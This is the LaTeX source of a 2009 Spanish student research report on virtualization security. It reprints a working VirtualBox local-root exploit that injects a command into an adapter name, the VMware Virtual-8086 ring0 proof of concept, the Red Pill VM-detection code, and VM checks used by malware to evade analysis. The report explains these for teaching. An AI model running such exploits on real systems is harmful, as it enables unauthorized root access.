\documentclass[spanish, a4paper, 11pt]{article}

\usepackage[a4paper,margin=3.5cm,top=3.0cm,bottom=3.0cm]{geometry}	% Define los margenes
\usepackage[spanish,activeacute]{babel}								% Idioma castellano
\usepackage{caratula}														% Caratula de Algo2
%\usepackage[a4paper=true,pagebackref=true]{hyperref}				% Agrega la TOC al PDF e hipervinculos
\usepackage[pdftex]{graphicx} 											% Permite insertar graficos
\usepackage{fancyhdr}														% Permite manejo de cabeceras de pagina
\usepackage{eufrak}															% Usado en el enunciado del trabajo
\usepackage{latexsym}


% Estilo de pagina para tener las cabeceras
\pagestyle{fancy}
\lhead{Seguridad en Virtualizacion}
\rhead{Matias Blanco - Diego Freijo - Andr'es Taraciuk}

% Numeracion de paginas
\pagenumbering{arabic}
\parskip=1.5ex

\newcommand{\imagen}[3]
{
	\begin{figure}[htbp]
	  \centering
	    \includegraphics[scale=0.5]{#1}
	  \caption{#3}
	\end{figure}
}

\newcommand{\nat}{\mathds{N}}
\newcommand{\algoritmo}[3]{\noindent {\bf\underline{#1}:} #2 $\longrightarrow$ #3}
\newcommand{\superindice}[1]{$^\textrm{{\tiny #1}}$}
\newcommand{\subsubsubsection}[1]{

{\bf\small #1}

}
\newcommand{\negrita}[1]{{\bf #1}}

\renewcommand\floatpagefraction{.9}
\renewcommand\topfraction{.9}
\renewcommand\bottomfraction{.9}
\renewcommand\textfraction{.1}   
\setcounter{totalnumber}{50}
\setcounter{topnumber}{50}
\setcounter{bottomnumber}{50}



%   Inicio del documento
\begin{document}

% Caratula
\materia{Seguridad de la Informaci'on}
\submateria{Segundo Cuatrimestre del 2009}
\titulo{Seguridad en Virtualizaci'on}
\subtitulo{Trabajo Pr'actico de Investigaci'on}
\integrante{Blanco, Matias}{508/05}{matiasblanco18@gmail.com}
\integrante{Freijo, Diego}{4/05}{giga.freijo@gmail.com}
\integrante{Taraciuk, Andr'es}{00/00}{ataraciuk@gmail.com}
\maketitle

\subsection*{Palabras Clave}
virtualizacion, seguridad, m'aquina virtual, hypervisor

% Indice
\clearpage
\tableofcontents

% Secciones
\clearpage
\section{Introducci'on}

\subsection{Definiciones}

La Virtualizaci'on consiste en la abstracci'on de recursos de una computadora. Es la implementaci'on de una m'aquina virtual (VM).
Una m'aquina virtual, a su vez, es la implementaci'on en software de una m'aquina que se comporta como una m'aquina f'isica. Una caracter'istica esencial de una VM es que el software que corre dentro de ella (llamado guest) se encuentra limitado a los recursos y abstracciones prove'idos por la VM, no deber'ia poder escaparse de su mundo virtual.
Existen dos grandes categor'ias de m'aquina virtual: de sistema y de proceso.

\subsection{VM de Sistema}

Una VM de Sistema provee una plataforma de sistema completa que permite la ejecuci'on de un sistema operativo completo. Las VM de Sistema poseen una capa de software encargada de la virtualizaci'on, llamado Hypervisor o Virtual Machine Monitor. Un hypervisor puede correr directamente sobre hardware (tipo 1 o VM nativa) o sobre un sistema operativo (tipo 2 o VM 'hosteada'). El 'virtual machine manager' (VMM) es el proceso encargado de la virtualizaci'on de una m'aquina virtual, y el hypervisor es, a su vez, el encargado de administrar los VMMs en ejecuci'on.
Una VM de sistema posee las siguientes ventajas:
\begin{itemize}
	\item M'ultiples entornos de SO pueden coexistir en el mismo hardware, en completa isolaci'on entre ellos.
	\item La VM puede proveer un set de instrucciones diferente al del hardware.
	\item Costos de mantenimiento reducidos, alta disponibilidad y la capacidad de recupero ante desastres.
\end{itemize}

Existen diferentes subcategor'ias de VM de sistema: virtualizaci'on completa (llamada simplemente 'Virtualizaci'on' con frecuencia), virtualizaci'on asistida por hardware, virtualizaci'on parcial, paravirtualizaci'on, virtualizaci'on a nivel de sistema operativo. A continuaci'on se detallar'an algunas de estas subcategor'ias.

\subsubsection{Virtualizaci'on (completa)}

La virtualizaci'on completa es la t'ecnica que ofrece un tipo de ambiente de m'aquina virtual, uno que es una simulaci'on completa del hardware donde corre. En este ambiente, cualquier aplicaci'on capaz de ejecutar sobre el hardware virtualizado puede ejecutarse. En especial, sistemas operativos.

Un problema central en virtualizaci'on completa es la intercepci'on y simulaci'on de las instrucciones privilegiadas (por ejemplo, instrucciones de I/O). El efecto de cada operaci'on dentro de una VM debe ser mantenido dentro de esa VM (operaciones virtuales no deber'ian poder alterar el estado de otra VM, del hypervisor o del hardware). Algunas instrucciones pueden ser ejecutadas directamente por el hardware, pues sus efectos se encuentran controlados por el hypervisor, por ejemplo, posiciones de memoria y registros aritm�ticos. Sin embargo, hay instrucciones que se escapar'ian del entorno virtual, y que entonces no debe estar permitido ejecutar directamente, tienen que ser capturadas y simuladas. Ejemplos de programas que ofrecen virtualizaci'on completa son VMware Workstation y VirtualBox.

\imagen{full_virtualization.png}{14}{Comparaci'on entre un entorno no virtualizado (izquierda) y un entorno con virtualizac'on completa (derecha)}

\subsubsection{Paravirtualizaci'on}

En este caso, se modifica el kernel del sistema operativo guest (o sea, el que es virtualizado), principalmente algunos drivers. A diferencia de en virtualizaci'on completa, el guest sabe que est'a en un entorno virtual, pues el kernel fue modificado para comunicarse directamente con el hypervisor. El objetivo principal es mejorar la performance en relaci'on con virtualizaci'on completa, modificando las llamadas cr'iticas para que, en vez de tener que pasar por el overhead de traducir las instrucciones desde el entorno f'isico al virtual, las llamadas se hagan directamente al hypervisor. La paravirtualizaci'on exige que el sistema operativo est'e expl'icitamente porteado para la nueva API, un sistema operativo convencional no puede ser montado directamente sobre un hypervisor paravirtualizado. El hypervisor de Xen es el ejemplo m'as conocido de paravirtualizaci'on.

\imagen{paravirtualization.png}{14}{En un entorno paravirtualizado, el sistema operativo tiene modificaciones para comunicarse directamente con el hypervisor}

\subsection{VM de Proceso}

Una VM de proceso corre como un proceso normal dentro del sistema operativo, y soporta un 'unico proceso. La VM es creada cuando el proceso a hostear es iniciado, y es destruida cuando el mismo termina. El objetivo es proveer un entorno de programaci'on independiente de la plataforma, abstrayendo detalles de hardware o SO. Las VMs de proceso proveen un alto nivel de abstracci'on, y son implementadas con un int'erprete, aunque pueden llegar a tener una performance comparada a un lenguage de programaci'on compilado con el uso de compilaci'on 'just in time'.

Ventajas de VM de proceso:
\begin{itemize}
\item Permite a las aplicaciones correr en entornos diferentes a los cuales fue pensado la aplicaci'on.
\item Puede proteger al sistema operativo u otras aplicaciones de c'odigo inseguro de la aplicaci'on virtualizada, pues cualquier problema no deber'ia expandirse por fuera de la VM.
\item Permite implementar el principio de seguridad de menor privilegio, pues el usuario final no necesitar'ia ser administrador para correr la aplicaci'on virtualizada.
\item Permite a las aplicaciones ser copiadas a un medio portable, y luego importadas sin la necesidad de ser instaladas en la otra m'aquina.
\end{itemize}

\subsubsection{Emulador}

Los emuladores son la subcategor'ia principal dentro de las VMs de proceso. Su objetivo es permitir ejecutar aplicaciones de una arquitectura dentro de otra. Un ejemplo es DOSBox, cuya funci'on es emular la l'inea de comandos de MS-DOS.

Otros ejemplos de emuladores conocidos: La m'aquina virtual de java, QEMU, Bochs.

\imagen{Java-jvm.png}{14}{Diagrama de c'omo la VM de java encapsula las diferentes arquitecturas y provee un entorno com'un para el bytecode.}

\subsection{Soporte de hardware para virtualizaci'on}

\subsubsection{Requerimientos para virtualizaci'on de Popek y Goldberg}

En 1974, Gerald J. Popek, de la universidad de California, y Robert P. Goldberg, de la universidad de Harvard y de Honeywell, publican un art'iculo donde especifican los requisitos que debe cumplir una arquitectura de hardware para soportar eficientemente la virtualizaci'on.

Popek y Goldberg introducen una clasificaci'on de las instrucciones de la arquitectura en tres categor'ias:
\begin{enumerate}
	\item Instrucciones sensibles de control: Son aqu'ellas que cambian la configuraci'on de recursos del sistema.
	\item Instrucciones sensibles de comportamiento: Son aqu'ellas cuyo resultado depende de la configuraci'on de los recursos.
	\item Instrucciones privilegiadas: Son aqu'ellas que, en modo usuario, resultan en una interrupci'on, con la consiguiente toma de control por parte del sistema operativo, y, en modo sistema, no resultan en una interrupci'on.
\end{enumerate}

El teorema de Popek y Goldberg dice lo siguiente:

Dada una arquitectura, un hypervisor puede ser implementado en ella si el conjunto de instrucciones sensibles (o sea, las instrucciones de tipo 1 o 2) est� incluido en el conjunto de instrucciones privilegiadas (las del tipo 3).

Si se cumple el teorema, las instrucciones que pueden afectar el correcto funcionamiento del hypervisor (las instrucciones sensibles) siempre resultan en interrupci'on (pues tambi'en son instrucciones privilegiadas), por lo que el hypervisor toma el control. De esta manera, nos aseguramos que el hypervisor tenga el control de los recursos de la VM.

Popek y Goldberg tambi'en dan un teorema para el concepto de Recursivamente Virtualizable, pero no vamos a hablar de ese concepto en este trabajo.

\subsubsection{Soporte de hardware para virtualizaci'on en la arquitectura x86}

En sus inicios, la arquitectura x86 no cumpl'ia con el teorema de Popek y Goldberg, por lo que era muy complicado para los programadores implementar software de virtualizaci'on para la arquitectura que no fuera muy ineficiente.

El set de instrucciones de la arquitectura x86, sin extensiones, contiene 17 instrucciones sensibles que no son privilegiadas, no cumpliendo, de esta forma con el teorema.

Mucho tiempo despu'es, tanto Intel como AMD crean, de manera independiente, extensiones a la arquitectura x86 que cumplen con el teorema de Popek y Goldberg. Intel, en 2005, desarolla `Intel VT-x', su extensi'on para virtualizaci'on. AMD, en 2006, realiza lo mismo, llamando a su extensi'on `AMD-V'. Ambas implementaciones difieren en ciertos aspectos, pero logran el mismo objetivo.

\subsection{Historia}

Las m'aquinas virtuales fueron desarrolladas en primera instancia por IBM en la d'ecada de 1960, como una manera de dividir l'ogicamente el hardware mainframe. De esta manera, se consegu'ia que los mainframes fueron 'multiproceso', corriendo varias aplicaciones al mismo tiempo. En esa 'epoca las mainframes eran un recurso muy caro, entonces eran dise~nadas para ser particionadas y, de esta manera, nivelar mejor la inversi'on. La virtualizaci'on fue abandonada en los 80 y los 90 cuando aplicaciones cliente-servidor y m'aquinas baratas con arquitectura x86 establecieron el modelo de computaci'on distribuida. Hoy en d'ia, las computadoras basadas en x86 est'an sufriendo el mismo problema de subutilizaci'on y rigidez que ten'ian las mainframes en 1960, y entonces el concepto de virtualizaci'on est'a volviendo a ser usado.

La primera apuesta realizada por IBM fue el sistema operativo CP-40, creado para la mainframe System/360. El sistema fue reemplazado r'apidamente por el sistema operativo CP-67. En sus inicios, la virtualizaci'on fue pensada como un proyecto interno de investigaci'on en IBM, y no como un producto. El hypervisor estuvo disponible comercialmente en 1972.

http://www.virtualization.info/
http://en.wikipedia.org
Gerald J. Popek and Robert P. Goldberg (1974). "Formal Requirements for Virtualizable Third Generation Architectures"
http://www.vmware.com
http://www.xen.org/

\clearpage
\section{Ataques}

\clearpage
\section{Vulnerabilidades}

En esta secci'on se van a discutir y analizar las principales vulnerabilidades encontradas en los 3 entornos de virtualizacion mas importantes como son VMWare, Sun VirtualBox y Microsoft VirtualPc.

\subsection{VirtualBox VBoxNetAdpCtl Privilege Escalation}

Esta vulnerabilidad reportada el 17 de Octubre del 2009 por Thomas Biege de SUSE Linux y patcheada por Sun el 17 de diciembre de este a�o explota un error en el uso de la funcion popen(). 
A continuacion se ve el codigo vulnerable:

%\lstset{language=C++, caption=Descriptive Caption Text, label=DescriptiveLabel}
\begin{verbatim}
#define VBOXADPCTL_IFCONFIG_PATH "/sbin/ifconfig"
    ...
static bool removeAddresses(const char *pszAdapterName)
{
    char szCmd[1024], szBuf[1024];
    char aszAddresses[MAX_ADDRESSES][MAX_ADDRLEN];

    memset(aszAddresses, 0, sizeof(aszAddresses));
    snprintf(szCmd, sizeof(szCmd), VBOXADPCTL_IFCONFIG_PATH " %s", pszAdapterName);
    FILE *fp = popen(szCmd, "r");

    if (!fp)
        return false;
    ...
    return true;
}
    ...
int main(int argc, char *argv[])
{
    const char *pszAdapterName;
    ...
           pszAdapterName = argv[1];
    ...
    if (fRemove)
    ...
   }
   else
   {
        /* We are setting/replacing address. */
    ...
            if (!removeAddresses(pszAdapterName))
    ...
   return rc;
}
\end{verbatim}

En el main de este modulo se ejecuta removeAddresses con el parametro pszAdapterName que viene de parametros de usuario. Una vez dentro de la funcion removeAddresses, se crea un path de la forma �/sbin/ifconfig DEVICE�, pero al ser el parametro con el que realiza el format string controlado por el usuario, el atacante puede ingresar con un pipe otros comandos a ser ejecutado por el shell con los privilegios de VBoxNetAdpCtl, que esta instalada como SUID root por defecto en varios sistemas operativos. Por lo tanto, el atacante gana privilegio de root en el host y de esta manera tiene privilegios para modificar los guest o el hypervisor.

Un exploit para la siguiente vulnerabilidad es el siguiente:

\begin{verbatim}
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
 
int main(int argc,char* argv[])
{
        char *env[] = {NULL};
    int platform, machine = 0;
    struct utsname* sysdetail = malloc(sizeof(struct utsname));
    printf("[ Sun VirtualBox <= 3.0.6 OSX/SOL/LINUX local root exploit\n");
    if(argc > 1){
        printf("[ Trying %s\n", argv[1]);
        execle(argv[1],argv[1],"vboxnet0|./runme","1::2",NULL,env);
        exit(0);
    }
    else{
        printf("[ No path provided, will attempt to exploit system default\n");
    }
    printf("[ Places a root shell in ./sh if succesful\n");
    uname(sysdetail);
    if(!strncmp("Darwin",sysdetail->sysname,strlen("Darwin")))
        platform = 1;
    if(!strncmp("SunOS",sysdetail->sysname,strlen("SunOS")))
        platform = 2;
    if(!strncmp("Linux",sysdetail->sysname,strlen("Linux")))
        platform = 3;
    switch(platform){
        case 1:
            printf("[ Detected a Mac OS X target\n");
            execle("/Applications/VirtualBox.app/Contents/MacOS/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
            break;
        case 2:
            printf("[ Detected a SunOS target\n");
            if(!strncmp("i86pc",sysdetail->machine,strlen("i86pc"))){
                printf("[ Detected SunOS is x86 platform\n");
                execle("/opt/VirtualBox/i386/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
            }
            else{
                printf("[ Guessing SunOS is amd64 platform\n");
                execle("/opt/VirtualBox/amd64/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
            }
            break;
        case 3:
            printf("[ Detected a Linux target\n");
            execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
            break;
        default:
            printf("[ Unknown OSE target. Try ./%s <path>/VBoxNetAdpCtl\n",argv[0]);
            break;
    }
        exit(0);
}
\end{verbatim}

Este codigo realiza la llamada a la aplicaci'on VBoxNetAdpCtl, previo chequeo de que sistema operativo se encuentre corriendo la maquina en ese momento. Esto impacta en el path al que se ataca, aunque se puede setear por los parametros del exploit.

En la linea

\begin{verbatim}
execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
\end{verbatim}

se ve que se esta ejecutando $VBoxNetAdpCtl$ con el parametro $vboxnet0|./runme$, lo que va a resultar que el programa termine ejecutando

\begin{verbatim}
popen(/sbin/ifconfig vboxnet0|./runme)
\end{verbatim}

runme es un programa que recibe parametros por consola para ejecutar, pero puede ser cambiado por cualquier otro para el uso del atacante.

El patch que aplico la gente de Sun fue el siguiente:

\begin{verbatim}
int checkAdapterName(const char *pcszNameIn, char *pszNameOut)
{
    int iAdapterIndex = -1;

    if (   strlen(pcszNameIn) >= VBOXNETADP_MAX_NAME_LEN
        || sscanf(pcszNameIn, "vboxnet%d", &iAdapterIndex) != 1
        || iAdapterIndex < 0 || iAdapterIndex > 99 )
    {
        fprintf(stderr, "Setting configuration for %s is not supported.\n", pcszNameIn);
        return ADPCTLERR_BAD_NAME;
    }
    sprintf(pszNameOut, "vboxnet%d", iAdapterIndex);
    if (strcmp(pszNameOut, pcszNameIn))
    {
        fprintf(stderr, "Invalid adapter name %s.\n", pcszNameIn);
        return ADPCTLERR_BAD_NAME;
    }

    return 0;
}
\end{verbatim}

Se reemplazo la llamada peligrosa al popen por execve y se agregaron nuevos chequeos basicos sobre el argumento de entrada.


\subsection{VMware Products Guest Privilege Escalation Vulnerability}

En este caso, vamos a analizar una vulnerabilidad reportada por Tavis Ormandy y Julien Tinnes de Google Security Team que afecta a todos los productos de virtualizacion de VMware, incluidos aquellos que utilizacion virtualizacion por hardware. Fue publicada el 27 de Octubre del 2009 por VMware en conjunto con los investigadores y el parche salio el mismo dia.

Al ser VMware una aplicacion propietaria y de codigo cerrado no fue divulgado el codigo vulnerable, pero si un analisis detallado de la vulnerabilidad.

En modo protegido, cpl es igual a los dos bits menos significativos del registro cs. Sin embargo, en modo Virtual-8086 $($el cual es un modo para correr aplicaciones de modo real que son incapaces de correr en modo protegido, como aplicaciones de MS-DOS por ejemplo$)$ el cpl es siempre 3, que significa menor privilegio, sin importar el valor del registro cs.

Cuando el procesador eleva una excepcio de page fault, un codigo de excepcion es introducido al stack conteniendo los flags usados por el sistema operativo para determinar el correcto curso de accion. Uno de esos flags es llamado U/S $($user/supervisor$)$, el cual es establecido si la falta ocurrio cuando el procesador estaba en modo usuario.

En el modo Virtual-8086, cuando VMware emula una instruccion de llamada larga (far call) o salto largo (far jump), incorrectamente introduce a la pila el valor devuelto de cs e ip usando acceso de supervisor, causando un codigo de excepcion incorrecto que es enviado al sistema operativo huesped.

Como el modo Virtual-8086 permite codigo de usuario para especificar el registro cs en un valor arbitrario, incluyendo los dos bits menos significativos, un atacante puede usar el acceso del supervisor para confundir al kerner y generar una elevacion de privilegios.

La siguiente prueba de concepto fue liberada por los autores:

\begin{verbatim}

//
// -----------------------------------
//  VMWare Workstation Virtual 8086 Linux Local ring0
// --------------------------- taviso@sdf.lonestar.org, julien@cr0.org -----
//
// Tavis Ormandy and Julien Tinnes, June 2009
//
//

#ifndef _GNU_SOURCE
# define _GNU_SOURCE
#endif
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/vm86.h>
#include <asm/unistd.h>

#include "vm86util.h"

static bool InitialiseVirtual8086();
static bool InstallShellCode();
static bool EnterVirtual8086();
static bool MapPageAtNull();

int main(int argc, char **argv)
{
    // Get a page mapped at NULL
    if (MapPageAtNull()) {
        fprintf(stderr, "mmap() failed: %m\n");
        return 1;
    }

    // Setup the Virtual 8086 address space
    InitialiseVirtual8086();

    // Install the shellcode that executes once we've gained control of the kernel
    InstallShellCode();

    // Trigger the VMWare Vulnerability
    EnterVirtual8086();

    // Not Reached
    abort();
}

static bool MapPageAtNull()
{
   return mmap(NULL, PAGE_SIZE, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
   0, 0) == MAP_FAILED;
}

static char Message[1024];
static size_t MessageSize;

static bool InstallShellCode()
{
    uint8_t *code;
    uint32_t codesize;

    // Message to print from ring0
    MessageSize = snprintf(Message, sizeof(Message), "<script>alert('ring0')</script>\n");

    CODE32("mov     esp, edi                        \n"     // Restore a usable stack
           "sub     esp, 0x50                       \n"     // Fixup stack pointer

           // Print message
           "mov     edx, MessageSize                \n"     // len
           "lea     ecx, Message                    \n"     // buf
           "mov     ebx, " SYM(STDOUT_FILENO) "     \n"     // fd
           "mov     eax, " SYM(__NR_write) "        \n"
           "int     0x80                            \n"     
             // write(STDOUT_FILENO, Message, sizeof(Message));

           // Now kill this process
           "mov     eax, " SYM(__NR_getpid) "       \n"
           "int     0x80                            \n"     // getpid()
           "mov     ebx, eax                        \n"     // pid
           "mov     ecx, " SYM(SIGKILL) "           \n"     // signal
           "mov     eax, " SYM(__NR_kill) "         \n"
           "int     0x80                            \n",    
             // kill(getpid(), SIGKILL);
           code,
           codesize);

    // Install it to the pnp bios jmp location
    memcpy(REAL(0x0000, 0x0000), code, codesize);

    return true;
}

static bool EnterVirtual8086()
{
    uint8_t *code;
    uint32_t codesize;
    vm86_t vm = {0};

    // Setup cpu type
    vm.cpu_type = CPU_586;

    // Setup registers
    vm.regs.eflags = EFLAGS_TF_MASK;
    vm.regs.esp = 0xDEADBEEF;
    vm.regs.eip = 0x00000000;
    vm.regs.cs = 0x0090;
    vm.regs.ss = 0xFFFF;

    CODE16("call 0xaabb:0xccdd", code, codesize);

    memcpy(REAL(vm.regs.cs, vm.regs.eip), code, codesize);

    vm86(Vm86Enter, &vm);

    return false;
}

static bool InitialiseVirtual8086()
{
    // Make the MMAP_PAGE_ZERO page rwx
    if (mprotect(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        return false;
    }

    // Stretch the page to 1MB for the entire real mode address space
    if (mremap(NULL, PAGE_SIZE, 1024 * 1024, 0) == MAP_FAILED) {
        return false;
    }

    // All done
    return true;
}

\end{verbatim}

En el exploit se ve como el atacante setea la memoria real como de escritura, ejecucion y lectura y la estira a 1MB (el limite). Luego, inserta el shellcode en el sector de PNP BIOS (que va a ser el causante del page fault). Este shellcode solo escribe en pantalla $<script>alert('ring0')</script>$, al ser este un exploit no-peligroso (ya que no causa real da'no a la victima, pero sirve para demostrar la vulnerabilidad).
Luego hace la llamada a 0xaabb:0xccdd, que es memoria no mapeada y al volver esta en modo supervisor el kernel y ejecuta el shellcode del PNP Bios con los privilegios elevados.

\subsection{VirtualPC instruction decoding Privilege Escalation}

Esta vulnerabilidad tambien reportada por Ormandy y Tinnes de Google en el 2009 con CVE 1542 explota algo similar a la anterior mostrada.

En este caso el problema radica en que ciertas instrucciones ejecutadas desde el guest son mal desencodeadas e interpretadas por el VMM, lo que causa que sean ejecutadas con permisos de supervisor.

Una de estas instrucciones es clts, la cual limpia el valor previo en el flag de task-switch en ring 0. Este flag se examina cada vez q se quiere ejecutar una instruccion de FPU. Si cada vez que el atacante quiere ejecutar codigo de FPU (FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4), setea esta instruccion con el bug anterior que falla en la desencodeo, siempre va a poder ejecutar dichas instrucciones en modo supervisor.

Microsoft arreglo este bug el 15 de julio del 2009 y publicando escasa informacion del mismo en conjunto con los descubridores del error.

\clearpage
\section{Detecci'on de entorno virtualizado}

En la siguiente seccion vamos a enumerar 2 de las principales formas de detectar si se esta corriendo en un entorno virtualizado. Esto es necesario en ciertos casos en los que se quiere que no se analice cierto software, como virus o malware, y se comportan de manera diferente al detectar virtualizacion. Principalmente se basan en errores u omisiones de emulacion de ciertas instrucciones no documentadas de los procesadores o tambien de algunas respuestas a instrucciones que son diferentes en entornos virtualizados, lo que da una idea cierta de esto.
Al estar estas soluciones basadas en fallas u omisiones, no siempre son 100$\%$ confiables. Hasta el momento no hay manera de saber si uno esta virtualizado sin depender de esto o de software instalado en el huesped (como vmware tools). Esto en parte se debe a que al ser la virtualizacion un metodo para aislar y dar la impresion de una maquina fisica, se trata de evitar justamente la deteccion.

\subsection{Red Pill - Joanna Rutkowska}

Quizas la manera mas difundida de deteccion por la facilidad y el poco codigo utilizado. Esta herramienta se aprovecha de la instruccion SIDT que guarda el contenido de la tabla de descripcion de interrumpciones (IDTR) en el operando de destino, que es realmente un lugar en la memoria. Se utiliza ya que esta instruccion puede ser ejecutada en un modo sin privilegios (ring 3), y al retornar lo hace con informacion sensible de dicha tabla, usada internamente por el sistema operativo.

Como solamente hay un solo registro IDTR, pero hay por lo menos dos sistemas operativos corriendo simultameneamente (el huesped y el anfitrion), el hypervisor necesita realocar el IDTR del huesped en un lugar seguro, para que no entre en conflictos con el mismo del anfitrion. El hypervisor no sabe si el huesped ejecuta la instruccion SIDT (ni cuando), ya que puede ser ejecutada desde el ring 3, entonces el proceso obtiene el lugar de la tabla de interrupciones movida. Por ejemplo en VMware, esta direccion es de la forma 0xffXXXXXX, en VirtualPC es 0xe8XXXXXX.

De esta manera se puede detectar el entorno virtualizado mediante la respuesta de una instruccion ejecutada con los privilegios minimos.

El codigo de la Red Pill es el siguiente:

\begin{verbatim}

  int swallow_redpill () {
       unsigned char m[2+4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
       *((unsigned*)&rpill[3]) = (unsigned)m;
       ((void(*)())&rpill)();
       return (m[5]>0xd0) ? 1 : 0;
     }

\end{verbatim}	

\subsection{Analisis de outputs de comandos en *nix}

Otra forma de verificar el entorno virtualizado es mediante la ejecucion del programa dmesg. En una plataforma recien encendida basta con $dmesg | grep -i virtual$, en cambio en una que ya tenga cierto tiempo corriendo es mas efectivo ejecutar $/var/log/dmesg | grep -i virtual$.

Aca esta un ejemplo para los diferentes softwares de virtualizacion:

\begin{verbatim}

 VMWare:

 # dmesg | grep -i virtual
 VMware vmxnet virtual NIC driver
   Vendor: VMware    Model: Virtual disk      Rev: 1.0 
 hda: VMware Virtual IDE CDROM Drive, ATAPI CD/DVD-ROM drive
 
 QEmu or KVM:

 # dmesg | grep -i virtual
 CPU: AMD QEMU Virtual CPU version 0.9.1 stepping 03

 Microsoft VirtualPC:

 # dmesg | grep -i virtual
 hda: Virtual HD, ATA DISK drive
 hdc: Virtual CD, ATAPI CD/DVD-ROM drive
 
\end{verbatim}

Otros comandos similares para verificar son dmidecode y cat /proc/ide/hd*/model.

\subsection{Aplicaciones de la deteccion - Caso Storm Worm}

Para ejemplificar, tomamos el caso del malware Storm Worm. Este fue detectado luego de un ataque a servidores de anti-spam en enero del 2007. Es un worm packeado con un packer hecho por el autor, que una vez ejecutado realiza ciertos chequeos. En algunas versiones del malware, uno de esos chequeos es verificar si esta corriendo en un sistema virtualizado o si un debugguer se encuentra enganchado al mismo. Si esto es correcto, el worm entra en un ciclo infinito, el cual deja inutilizable el sistema donde se lo esta probando y obliga a un reinicio del mismo. Estos chequeos los realiza para dificultar el analisis del malware y ocultar sus procedimientos.

\imagen{storm-vmware.png}{14}{Codigo ASM del chequeo de VMware}

Para detectar VMware por ejemplo, este malware utiliza un metodo publicado por Ken Kato (http://chitchat.at.infoseek.co.jp/vmware/backdoor.html). Este consiste en el uso de un puerto de entrada salida (0x5658 = �VX�) el cual es usado con un numero "magico" (0x564D5868 = �VMXh�). Luego de ejecutar la instruccion IN como se ve en el grafico, si el programa esta siendo ejecutado en un entorno virtualizado, en el registro EBX queda el contenido del numero magico. Si el malware esta siendo depurado, se puede cambiar el valor de EBX en el momento y esquivar ese chequeo.

\imagen{storm-virtualpc.png}{14}{Codigo ASM del chequeo de VirtualPC}

Por otro lado, para detectar si esta siendo ejecutado en VirtualPC, Storm Worm utiliza el metodo de Elias Bachaalany (http://www.codeproject.com/system/VmDetect.asp). Este metodo consiste en utilizar codigos de operacion de instruccion ilegales. Utiliza un manejador de excepciones al llamar a esos codigos, el cual es ejecutado cuando se corre en un entorno fisico, pero en una maquina virtual no sucede ya que VirtualPC maneja esa excepcion. El programa de chequeo se da cuenta de esto ya que el registro EBX se mantiene en 0 cuando VirtualPC esta corriendo.


\end{document}

% EOF